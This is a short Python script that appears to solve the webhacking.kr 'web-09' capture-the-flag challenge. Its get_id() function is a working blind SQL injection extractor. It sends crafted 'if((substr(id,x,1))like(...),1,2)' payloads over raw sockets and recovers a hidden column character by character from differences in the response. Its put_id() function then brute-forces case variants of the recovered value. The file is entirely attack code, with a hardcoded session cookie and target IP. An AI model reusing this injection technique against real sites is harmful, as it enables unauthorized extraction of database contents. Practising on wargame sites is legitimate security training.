import socket

def get_id():
    array = [[],[],[],[],[],[]]
    for x in range(1, 1000):   
        for y in range(0, 256):
            send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
            data = "GET /challenge/web/web-09/index.php?no=if((substr(id," + str(x) + ",1))like(" + hex(y) + "),1,2) HTTP/1.1\r\n" + \
                    "Host: webhacking.kr\r\n" + \
                    "Cookie: PHPSESSID=383bfebeed53831a47350e2d6779f3f4\r\n" + \
                    "\r\n"

            send.connect(("183.111.174.96", 80))
            send.send(data.encode())
            recv = send.recv(3000)
            send.close()
            if "Apple" in recv.decode() and y != 0x25:
                array[x - 1] += [hex(y)]
                print("x=" + str(x) + ": " + str(array))

def put_id():
    for x in "aA_":
        for y in "pP_":
            for z in "pP_":
                for i in "lL_":
                    for j in "eE_":    
                        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
                        data = "GET /challenge/web/web-09/index.php?no=3&id=" + x + y + z + i + j + " HTTP/1.1\r\n" + \
                                        "Host: webhacking.kr\r\n" + \
                                        "Cookie: PHPSESSID=383bfebeed53831a47350e2d6779f3f4\r\n" + \
                                        "\r\n"

                        send.connect(("183.111.174.96", 80))
                        send.send(data.encode())
                        recv = send.recv(3000)
                        send.close()
                        if "Secret" not in recv.decode():
                            print(x + y + z + i + j)

                        print(recv.decode())
